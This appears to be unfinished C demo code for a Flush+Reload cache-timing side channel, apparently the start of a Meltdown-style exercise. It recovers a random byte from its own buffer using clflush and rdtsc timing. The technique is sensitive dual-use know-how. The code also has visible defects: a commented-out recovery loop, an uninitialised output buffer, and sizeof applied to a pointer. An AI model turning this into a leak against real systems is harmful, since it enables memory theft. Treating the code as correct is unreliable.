#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define REPS_THRES 1000000
#define BYTE 256
#define PAGE_SIZE 4096
#define CACHE_LINE 64 

char* secret_data;	
char* probe;	

static void flush(void *p) {
    asm volatile("mfence\nclflush 0(%0)\n" : : "c"(p) : "rax");
    //_mm_clflush(&p);
}

static void load(void *p) {
    asm volatile("mfence\nmovq (%0), %%rax\n" : : "c"(p) : "rax");
}

static int64_t rdtsc() {
    // u_int64_t a = 0, d = 0;
    // asm volatile("mfence");
    // asm volatile("rdtsc" : "=A"(a));
    // a = (d << 32) | a;
    // asm volatile("mfence");
    // return a;
    return __rdtsc();
}
  
static int64_t timed_access(void *p, int do_flush, int do_preload) {
    if (do_flush) {
        flush(p);
    } else if (do_preload) {
        load(p);
    }
     
    uint64_t x = rdtsc();
    load(p);
    return rdtsc()-x;
}
static int64_t get_threshold() {
    long int time_flushed = 0;
    long int time_unflushed = 0;

    for (int i = 0; i < REPS_THRES; i++)
    {
        time_flushed += timed_access(probe, 1, 0);
        time_unflushed += timed_access(probe, 0, 1);
    }

    printf("on average it took this long to call unflushed: %ld\n", time_unflushed/REPS_THRES);
    printf("it took this long to call flushed: %ld\n", time_flushed/REPS_THRES);
    printf("average diff: %ld\n", (time_flushed-time_unflushed)/REPS_THRES);

    return (time_flushed+time_unflushed)/(2*REPS_THRES);
}


static char melt_char(void *p, char* probe, int64_t thres) {
    char c = 0;
    for (int i = 0; i < BYTE; i++)
    {
        flush(probe+i*CACHE_LINE);
    }
    // printf("flushed probe array\n");

    int64_t access_times[BYTE];

    char _ = probe[(*(volatile char *)p) * CACHE_LINE];
    // printf("char: %c\n", *(volatile char *)p);

    for (int i = 0; i < BYTE; i++)
    {
        access_times[i] = timed_access(probe+i*CACHE_LINE, 0,0);
        printf("character %c took %ld with thres %ld\n", i, access_times[i], thres);
        if (access_times[i] < thres) {
            if (c == 0) {
                c = i;
            } 
        }
    }
    return c;
}

void main()
{   
    secret_data = malloc(20);
    probe = malloc(BYTE * CACHE_LINE);
    for (int i = 0; i < 20; i++)
    {
        int r =  rand() % 95 + 32; // Get ASCII character in [32,127], i.e. in the range of printable characters
        secret_data[i] = r; 
    }
    printf("created random printable character array: %s\n", secret_data);


    int64_t thres = get_threshold();
    printf("computed threshold: %ld\n", thres);


    char* recovered_data = malloc(sizeof(secret_data)); 


    melt_char(secret_data, probe, thres);

    // for (int i = 0; i < sizeof(secret_data) / sizeof(char); i++)
    // {
    //     recovered_data[i] = melt_char(secret_data + i, probe, thres);
    // }
    
    printf("got: %s", recovered_data);
    
}

